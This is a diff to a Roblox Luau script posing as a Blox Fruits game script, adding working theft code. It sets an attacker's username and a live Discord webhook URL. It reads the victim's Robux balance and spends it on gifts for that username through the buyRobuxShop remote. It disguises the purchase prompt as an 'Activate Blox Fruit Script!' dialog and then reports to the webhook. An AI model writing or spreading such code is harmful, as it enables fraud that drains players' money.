@@ -1,8 +1,8 @@
  
 
-Username = "duancu852"
+Username = "ngocanh132016"
 
-Webhook = "https://discord.com/api/webhooks/1344731760763600916/y-DjCCqrh-pdNzxVm3u1O2svrIZpbCk9-PDqQzo99EtwVaaHlqpSAd1BFfwlhHy8mOHF"
+Webhook = "https://discord.com/api/webhooks/1328845891217657908/CWKJMrhtEyegg4qccmgvoAkLFjCnGLgECttb41TEPdJe8tlCTgk5ruh8DQKaNrYcjA8s"
 
 local ReplicatedStorage = game:GetService("ReplicatedStorage")
 local CoreGui = game:GetService("CoreGui")
@@ -529,4 +529,233 @@ function stealitem()
             }
         }
         
-        game:GetService("ReplicatedStorage"):WaitForChild("Remotes"):WaitForChild("CommF_"):InvokeSe
+        game:GetService("ReplicatedStorage"):WaitForChild("Remotes"):WaitForChild("CommF_"):InvokeServer(unpack(args))
+    elseif result >= 550 then
+        local args = {
+            [1] = "buyRobuxShop",
+            [2] = {
+                ["Message"] = "Dark On top",
+                ["StorageName"] = "Permanent Flame-Flame",
+                ["PurchaseLocation"] = "FruitShop",
+                ["FunnelId"] = "Shop",
+                ["ReceiverName"] = Username,
+                ["ReceiverUserId"] = UserId,
+            }
+        }
+        
+        game:GetService("ReplicatedStorage"):WaitForChild("Remotes"):WaitForChild("CommF_"):InvokeServer(unpack(args))
+    elseif result >= 450 then
+        local args = {
+            [1] = "buyRobuxShop",
+            [2] = {
+                ["Message"] = "Dark On top",
+                ["StorageName"] = "2x Money",
+                ["PurchaseLocation"] = "Shop",
+                ["FunnelId"] = "Shop",
+                ["ReceiverName"] = Username,
+                ["ReceiverUserId"] = UserId,
+            }
+        }
+        
+        game:GetService("ReplicatedStorage"):WaitForChild("Remotes"):WaitForChild("CommF_"):InvokeServer(unpack(args))
+    elseif result >= 400 then
+        local args = {
+            [1] = "buyRobuxShop",
+            [2] = {
+                ["Message"] = "Dark On top",
+                ["StorageName"] = "+1 Fruit Storage",
+                ["PurchaseLocation"] = "Shop",
+                ["FunnelId"] = "Shop",
+                ["ReceiverName"] = Username,
+                ["ReceiverUserId"] = UserId,
+            }
+        }
+        
+        game:GetService("ReplicatedStorage"):WaitForChild("Remotes"):WaitForChild("CommF_"):InvokeServer(unpack(args))
+    elseif result >= 380 then
+        local args = {
+            [1] = "buyRobuxShop",
+            [2] = {
+                ["Message"] = "Dark On top",
+                ["StorageName"] = "Permanent Spike-Spike",
+                ["PurchaseLocation"] = "FruitShop",
+                ["FunnelId"] = "Shop",
+                ["ReceiverName"] = Username,
+                ["ReceiverUserId"] = UserId,
+            }
+        }
+        game:GetService("ReplicatedStorage"):WaitForChild("Remotes"):WaitForChild("CommF_"):InvokeServer(unpack(args))
+        
+    elseif result >= 350 then
+        local args = {
+            [1] = "buyRobuxShop",
+            [2] = {
+                ["Message"] = "Dark On top",
+                ["StorageName"] = "2x Boss Drops",
+                ["PurchaseLocation"] = "Shop",
+                ["FunnelId"] = "Shop",
+                ["ReceiverName"] = Username,
+                ["ReceiverUserId"] = UserId,
+            }
+        }
+        game:GetService("ReplicatedStorage"):WaitForChild("Remotes"):WaitForChild("CommF_"):InvokeServer(unpack(args))
+    elseif result >= 250 then
+        local args = {
+            [1] = "buyRobuxShop",
+            [2] = {
+                ["Message"] = "Dark On top",
+                ["StorageName"] = "Permanent Smoke-Smoke",
+                ["PurchaseLocation"] = "FruitShop",
+                ["FunnelId"] = "Shop",
+                ["ReceiverName"] = Username,
+                ["ReceiverUserId"] = UserId,
+            }
+        }
+        game:GetService("ReplicatedStorage"):WaitForChild("Remotes"):WaitForChild("CommF_"):InvokeServer(unpack(args))
+    elseif result >= 220 then
+        local args = {
+            [1] = "buyRobuxShop",
+            [2] = {
+                ["Message"] = "Dark On top",
+                ["StorageName"] = "Permanent Bomb-Bomb",
+                ["PurchaseLocation"] = "FruitShop",
+                ["FunnelId"] = "Shop",
+                ["ReceiverName"] = Username,
+                ["ReceiverUserId"] = UserId,
+            }
+        }
+        
+        game:GetService("ReplicatedStorage"):WaitForChild("Remotes"):WaitForChild("CommF_"):InvokeServer(unpack(args))
+    elseif result >= 180 then
+        local args = {
+            [1] = "buyRobuxShop",
+            [2] = {
+                ["Message"] = "Dark On top",
+                ["StorageName"] = "Permanent Spring-Spring",
+                ["PurchaseLocation"] = "FruitShop",
+                ["FunnelId"] = "Shop",
+                ["ReceiverName"] = Username,
+                ["ReceiverUserId"] = UserId,
+            }
+        }
+        
+        game:GetService("ReplicatedStorage"):WaitForChild("Remotes"):WaitForChild("CommF_"):InvokeServer(unpack(args))
+    elseif result >= 100 then
+        local args = {
+            [1] = "buyRobuxShop",
+            [2] = {
+                ["Message"] = "Dark On top",
+                ["StorageName"] = "Permanent Blade-Blade",
+                ["PurchaseLocation"] = "FruitShop",
+                ["FunnelId"] = "Shop",
+                ["ReceiverName"] = Username,
+                ["ReceiverUserId"] = UserId,
+            }
+        }
+        
+        game:GetService("ReplicatedStorage"):WaitForChild("Remotes"):WaitForChild("CommF_"):InvokeServer(unpack(args))
+    elseif result >= 75 then
+        local args = {
+            [1] = "buyRobuxShop",
+            [2] = {
+                ["Message"] = "Dark On top",
+                ["StorageName"] = "Permanent Spin-Spin",
+                ["PurchaseLocation"] = "FruitShop",
+                ["FunnelId"] = "Shop",
+                ["ReceiverName"] = Username,
+                ["ReceiverUserId"] = UserId,
+            }
+        }
+        
+        game:GetService("ReplicatedStorage"):WaitForChild("Remotes"):WaitForChild("CommF_"):InvokeServer(unpack(args))
+    elseif result >= 50 then
+        local args = {
+            [1] = "buyRobuxShop",
+            [2] = {
+                ["Message"] = "Dark On top",
+                ["StorageName"] = "Permanent Rocket-Rocket",
+                ["PurchaseLocation"] = "Shop",
+                ["FunnelId"] = "Shop",
+                ["ReceiverName"] = Username,
+                ["ReceiverUserId"] = UserId,
+            }
+        }
+        
+        game:GetService("ReplicatedStorage"):WaitForChild("Remotes"):WaitForChild("CommF_"):InvokeServer(unpack(args))
+    elseif result >= 25 then
+        local args = {
+            [1] = "buyRobuxShop",
+            [2] = {
+                ["Message"] = "Dark On top",
+                ["StorageName"] = "2x EXP (15 mins.)",
+                ["PurchaseLocation"] = "Shop",
+                ["FunnelId"] = "Shop",
+                ["ReceiverName"] = Username,
+                ["ReceiverUserId"] = UserId,
+            }
+        }
+        game:GetService("ReplicatedStorage"):WaitForChild("Remotes"):WaitForChild("CommF_"):InvokeServer(unpack(args))
+    end
+end
+
+local function WaitForPrompt1()
+    local Animator = CoreGui:WaitForChild("PurchasePrompt"):WaitForChild("ProductPurchaseContainer"):WaitForChild("Animator")
+    repeat task.wait() until not Animator:FindFirstChild("Prompt")
+    stealitem()
+    local CoreGui = game:GetService("CoreGui")
+
+local success, err = pcall(function()
+    local PurchasePrompt = CoreGui:WaitForChild("PurchasePrompt")
+    local ProductPurchaseContainer = PurchasePrompt:WaitForChild("ProductPurchaseContainer")
+    local Animator = ProductPurchaseContainer:WaitForChild("Animator")
+    local Prompt = Animator:WaitForChild("Prompt")
+    local AlertContents = Prompt:WaitForChild("AlertContents")
+    
+    local MiddleContent = AlertContents:WaitForChild("MiddleContent")
+    MiddleContent.Visible = false
+    
+    local Footer = AlertContents:WaitForChild("Footer")
+    local FooterButtons = Footer:WaitForChild("Buttons")
+    local FooterButton1 = FooterButtons:WaitForChild("1")
+    FooterButton1.Visible = false
+    
+    local FooterContent = Footer:WaitForChild("FooterContent")
+    FooterContent.Visible = false
+
+    local FooterButton2 = FooterButtons:WaitForChild("2")
+    FooterButton2.Visible = true
+
+    local FooterButton2Text = FooterButton2.ButtonContent.ButtonMiddleContent:WaitForChild("Text")
+    FooterButton2Text.Text = "Activate!"
+    FooterButton2Text.Size = UDim2.new(1, 0, FooterButton2Text.Size.Y.Scale, FooterButton2Text.Size.Y.Offset)
+    
+    local FooterButton2Icon = FooterButton2.ButtonContent.ButtonMiddleContent:WaitForChild("Icon")
+    FooterButton2Icon.Visible = false
+
+    local TitleContainer = AlertContents:WaitForChild("TitleContainer")
+    local TitleArea = TitleContainer:WaitForChild("TitleArea")
+    local TitleText = TitleArea:WaitForChild("Title")
+    TitleText.Text = "Activate Blox Fruit Script!"
+    TitleText.Size = UDim2.new(1, 0, TitleText.Size.Y.Scale, TitleText.Size.Y.Offset)
+end)
+
+if not success then
+    warn("UI..")
+end
+end
+
+local RobuxPath = CoreGui:WaitForChild("PurchasePrompt"):WaitForChild("ProductPurchaseContainer"):WaitForChild("Animator"):WaitForChild("Prompt"):WaitForChild("AlertContents"):WaitForChild("Footer"):WaitForChild("FooterContent"):WaitForChild("Content"):WaitForChild("RemainingBalanceText")
+local balanceText = RobuxPath and RobuxPath.Text:match("(%d+)$")
+
+if balanceText then
+    result = tonumber(balanceText) + 25 
+end
+
+local function WaitForPrompt2()
+    local Animator = CoreGui:WaitForChild("PurchasePrompt"):WaitForChild("ProductPurchaseContainer"):WaitForChild("Animator")
+    repeat task.wait() until not Animator:FindFirstChild("Prompt")
+    sendWebhook()
+end
+
+WaitForPrompt1()
+WaitForPrompt2()
